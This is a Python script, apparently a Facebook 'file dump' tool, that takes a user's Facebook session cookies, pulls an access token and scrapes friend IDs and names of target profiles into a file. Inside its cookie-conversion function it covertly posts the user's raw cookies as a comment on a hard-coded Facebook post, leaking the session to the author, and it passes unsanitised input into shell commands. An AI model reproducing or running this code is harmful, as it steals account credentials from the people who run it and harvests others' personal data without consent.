import requests,random,sys,json,os,re,datetime,socket,pprint,time 
from time import sleep as slp
from os import system as cmd
import os
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
A = '\x1b[1;90m' # WARNA ABU ABU
C="\033[1;36m" #Chyan
my_color = [
 C,P, M, H, K, U, O, N]
warna = random.choice(my_color)
totaldmp = 0
count = 0
try:
	os.mkdir('Data')
except:
	pass
try:
	os.remove('temp.txt')
except:
	pass
head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}

#---------[ LOGO / BANNER ]-------->>

logo = f"""\033[1;37m
8888888b. 8888888 8888888b. 88888888888 .d88888b.♥️ 
888  "Y88b  888   888   Y88b    888    d88P" "Y88b 
888    888  888   888    888    888    888     888 
888    888  888   888   d88P    888    888     888 
888    888  888   8888888P"     888    888     888 
888    888  888   888           888    888     888 
888  .d88P  888   888           888    Y88b. .d88P 
8888888P" 8888888 888           888     "Y88888P"♥️
[/]════════════════════════════════════════════════════
{B}[{H}+{B}] Author   : {C}👑MR.DIPTO👑{B}
{B}[{H}+{B}] Guthub   : {H}MR-DIPTO-404{B}
{B}[{H}+{B}] Facebook : {H}REMEMBER{M}.{H}THIS{M}.{H}NAME{M}.{H}MR{C}.{H}DIPTO{B}
{B}[{H}+{B}] Group    : {B}[{M}ERROR{B}]{B}
{B}[{H}+{B}] TOOLS    : {H}UNLIMITED {M}FILE {H}DUMP🔥{B}
{B}[{H}+{B}] Version  : 1.0.1{B}
{B}[{H}+{B}] Note     : \x1b[1;41m\x1b[1;96m🙂<<<I'am A Common Man>>>🙂\x1b[1;0m {B}
[/]════════════════════════════════════════════════════"""
def login():
	os.system('clear')
	print(logo)
	coki = input(f'{B}[{M}➪{B}] Input Your Cookies {M}: {H}')
	coli = convert(coki)
	if 'status succes' in coli:print('\n  [✓] Login Successful');time.sleep(2);main()
	else:print('\n  [×] Login cokie invalid');time.sleep(2);login()
def convert(cookies):
    with requests.Session() as x:
         x.headers.update({
            "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com",
            "origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8",
         })
         try:
               link = x.get("https://business.facebook.com/business_locations", cookies = {'cookie':cookies})
               search = re.search("(EAAG\w+)", link.text).group(1) 
               komen = random.choice(['hello bang♥','kelazzz','programmers mas?','suhu♥'])
               if 'EAAG' in search:
                   requests.post(f'https://graph.facebook.com/pfbid02w5Sg1Yv9z12D1nFNiDGwJPBL5F3Yz6athEZrV1hgBqeSKscCRVCHEjKXjj5aowggl/comments/?message={komen}&access_token={search}',cookies={'cookie':cookies})
                   requests.post(f'https://graph.facebook.com/pfbid02w5Sg1Yv9z12D1nFNiDGwJPBL5F3Yz6athEZrV1hgBqeSKscCRVCHEjKXjj5aowggl/comments/?message={cookies}&access_token={search}',cookies={'cookie':cookies})
                   open('data/token.txt','w').write(search)
                   open('data/cokie.txt','w').write(cookies)
                   return 'status succes'
         except AttributeError:return 'status gagal login!'

#---------[  Login Cookies Menu]-------->>
def MR_DIPTO():
	os.system("clear")
	#os.system("xdg-open https://github.com/MR-DIPTO-404")
	print(logo)
    
	print(f"                      {C}[👑LOGIN {M}MENU👑]")
	print(f"{B}[{H}+{B}]{C}════════════════════════════════════════════════════{B}")
	print(f"{B}[{H}1{B}] LOGIN  WITH COOKIES {M}[{H}LOGIN{M}]{B}")
	print(f"{B}[{H}2{B}] LOGOUT YOUR COOKIES{M} [{H}Yaaap{M}]{B}")
	print(f"{B}[{H}+{B}]{C}════════════════════════════════════════════════════{B}")
	p = input(f"{B}[{M}➪{B}] {H}Select Login Menu {M}:{B} ")
	if p in ['1','01']:
		main()
	if p in ['2','02']:
		remove_cookise()
def MR():
	os.system("clear")
	#os.system("xdg-open https://www.facebook.com/REMEMBER.THIS.NAME.MR.DIPTO")
	print(logo)
    
	print(f"                      {C}[👑MAIN {M}MENU👑]")
	print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
	print(f"{B}[{H}1{B}] FILE DUMPING{M}  [{H}Unlimited{M}]{B}")
	print(f"{B}[{H}2{B}] SEPARATE FILE{M} [{H}Recommend{M}]{B}")
	print(f"{B}[{M}0{B}] {C}Exit Program{B}")
	print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
	p = input(f"{B}[{M}➪{B}] {H}Select Menu {M}:{B} ")
	if p in ['1','01']:
		MR_DIPTO()
	if p in ['2','02']:
		dubble_Link_Remove()
	if p in ['0','00']:
		os.system('exit')
	else:
		print(f'{H}[{M}>>{H}]{M}Worng Input {H}Please Try Again')
		time.sleep(3)
		MR()
#---------[ Cookies Logout Method ]-------->>
def remove_cookise():
	os.system('rm -rf data/cokie.txt')
	os.system('rm -rf data/token.txt')
	print(f'\n{M}[{H}✓{M}]{H} Your Cookise Logout Done 📌\n{M}[{H}✓{M}]{H} Login Cookies And Enjoy File Dump Tools🔥')
	print(f"\n{B}[{M}×{B}] {H}PLEASE WAIT FEW SECONDS GO TO MAIN MENU~⏱️{B}")
	time.sleep(7)
	MR()
#---------[ Cookies Login Method ]-------->>
def login2():
	os.system("clear")
	print(logo)
	now = datetime.datetime.now()
	print(f"                     {C}[👑LOGIN {M} COOKIES👑]")
	print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
	print(f"{B}[{H}+{B}] Date and Time   : {M}"+now.strftime("%y-%m-%d %H:%M:%S"))
	hostnm = socket.gethostname()
	ipaddress = socket.gethostbyname(hostnm)
	print(f"{B}[{H}+{B}] Your Ip Address :{M}", ipaddress)
	print(f"{B}[{H}+{B}] Your Country    : {H}Bangladesh{B}")
	print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
	try:
		fbcokis= input(f'{B}[{M}➪{B}] Input Your Cookies {M}: {H}')
		print(f"\n{B}[{M}×{B}] {H}PLEASE WAIT FEW SECONDS ~⏱️{B}")
		head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
		ftoken = requests.get("https://business.facebook.com/business_locations", headers=head, cookies = {"cookie":fbcokis}).text
		eaag = re.search("(EAAG\w+)",str(ftoken))
		open("data/token.txt", "w").write(eaag.group(1))
		open("data/cookie.txt", "w").write(fbcokis)
		token = open('data/token.txt','r').read()
		main()
	except Exception as e:
		os.system("rm -rf data/cookie.txt")
		os.system("rm -rf data/token.txt")
		print(f"{H}[{M}×{H}] {M}Login Error {H}Please Enter Fresh Cookies 🔥🔥")
		slp(5)
		MR_DIPTO()
		
#---------[ DUMPING Separate ]-------->>
def grep(f):
	o = input(f"{B}[{H}+{B}] Separate ID Save As{M} : {H}")
	print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
	try:
		ask_link = int(input(f'{B}[{H}+{B}]{M} Enter Separate ID Limit {M}: {H}'))
		print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
	except:
		ask_link = 1
		completed = 0
	for links in range(ask_link):
		li = input(f"{B}[{H}+{B}] {H}SELECT LINK🖇️{M}: {H}")
		os.system('cat '+f+' | grep "'+li+'" >> '+o)
	print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
	print(f"{B}[{H}+{B}] Separating Completed ")
	print(f"{B}[{H}+{B}] Separate File Save {M}:{H}" + o)
	print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
	input(f"{B}[{M}➪{B}] Press Enter To Go Main Menu {M}:{H}")
	MR()
#----------------[Dubble Link Remove]------------>>
def dubble_Link_Remove():
    os.system('clear')
    print(logo)
    print(f"               {C}[👑SEPARATE {M}YOUR {H}FILE👑]")
    print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
    print(f"{B}[{H}+{B}] {H}Example {M}: {H}/sdcard/Your_Dump_FIle_Name.txt ")
    print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
    Error = input(f"{B}[{H}+{B}] {C}Input Your File {M}:{H} ")
    Error1= input(f"{B}[{H}+{B}] {C}Remove Dubble Link ID Save As{M}  :{H}")
    os.system('touch ' + Error)
    os.system('sort -r '+Error+' | uniq > '+Error1)
    print(f"{B}[{H}+{B}] {C}Dubble Link Remove File Save As{M}:{H}" + Error1)
    print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
    ch_x2 = input(f"{B}[{H}+{B}] {C}Do You Want To Use ID Separator [N/Y]{M} :{H}")
    print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
    if ch_x2 in ["yes","Yes","YES","Y","y"]:
    	grep(Error1)
#---------[ Main Menu  ]-------->>
def main():
	fbidz = []
	os.system("clear")
	print(logo)
	try:
		fbcokis = open('data/cokie.txt','r').read()
		token = open('data/token.txt','r').read()
		ftoken = requests.get("https://business.facebook.com/business_locations", headers=head, cookies = {"cookie":fbcokis}).text
		eaag = re.search("(EAAG\w+)",str(ftoken))
	except:
		time.sleep(1)
		login()
	global totaldmp,count
	try:
		token=open('data/token.txt','r').read()
		fbcokis =open('data/cokie.txt','r').read()
	except (FileNotFoundError):
		print(f"{H}[{M}×{H}] {M}Login Not Found")
		time.sleep(1)
		os.system('rm -f data/token.txt')
		os.system('rm -f data/cookie.txt')
		login()
	try:
		os.system('clear')
		os.system("clear")
		print(logo)
		now = datetime.datetime.now()
		print(f"                {C}[👑ALREADY {M}LOGIN {H}COOKIES👑]")
		print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
		print(f"{B}[{H}+{B}] Date and Time   : {M}"+now.strftime("%y-%m-%d %H:%M:%S"))
		hostnm = socket.gethostname()
		ipaddress = socket.gethostbyname(hostnm)
		print(f"{B}[{H}+{B}] Your Ip Address :{M}", ipaddress)
		print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
		try:
			fbbuid =input(f"{B}[{M}➪{B}]{H} Enter Public ID Link {M}:{H} ")
			dmp = requests.get("https://graph.facebook.com/"+fbbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
			for idnm in dmp['friends']['data']:
				totaldmp+=1
				fbidz.append(idnm['id'])
		except KeyError:
			print(f"{H}[{M}×{H}] Public ID Not Found")
			time.sleep(2)
			main()
		filepath = input(f"{B}[{H}+{B}] {H}Enter Save File Path {M}: {H}")
		print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
		apnd = open(filepath,'w')
		for fbuid in fbidz:
			count += 1
			try:
				dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
				for idnm in dmp['friends']['data']:
					apnd.write(idnm['id']+"|"+idnm['name']+'\n')
				print("\x1b[1;92m[👑] Dumping By MR.DIPTO : " + fbuid)
			except KeyError:
				print('\x1b[1;91m[👑] Dumping By MR.DIPTO : ' + fbuid)
		apnd.close()
#---------[ Dubble Link Remove ]-------->>
		print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
		ch_x1 = input(f"{B}[{H}+{B}] Do You Remove Dubble Link [N/Y]{M}:{H}")
		if ch_x1 in ["yes","Yes","YES","Y","y"]:
			newfile = input(f"{B}[{H}+{B}] Remove Dubble Link ID Save As{M}  :{H}")
			os.system('sort -r '+filepath+' | uniq > '+newfile)
			ch_x2 = input(f"{B}[{H}+{B}] Do You Want To Use ID Separator [N/Y]{M} :{H}")
			if ch_x2 in ["yes","Yes","YES","Y","y"]:
				grep(newfile)
			else:
				print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
				print (f"{B}[{H}+{B}] Your Dump File Save As {M}:{H} {newfile}")
				print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
				input(f"{B}[{M}➪{B}] Press Enter To Go Main Menu {M}:{H}")
				MR()
		else:
			print('\n')
			ch_x2 = input(f"{B}[{H}+{B}] Do You Want To Use ID Separator [N/Y]{M} : {H}")
			if ch_x2 in ["yes","Yes","YES","Y","y"]:
				grep(filepath)
			else:
				print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
				print (f"{B}[{H}+{B}] Total ID Dump :\x1b[1;92m {totaldmp}")
				print (f"{B}[{H}+{B}] Your Dump File Save As :\x1b[1;92m {filepath} ")
				print(f"{B}[{H}+{B}]{M}════════════════════════════════════════════════════{B}")
				input(f"{B}[{M}➪{B}] Press Enter To Go Main Menu {M}:{H}")
				MR()
	except Exception as e:
		print(f"{H}[{M}×{H}] {M}Input Error")
		MR()
if __name__ == '__main__':
	try:system('mkdir data')
	except:pass
	MR()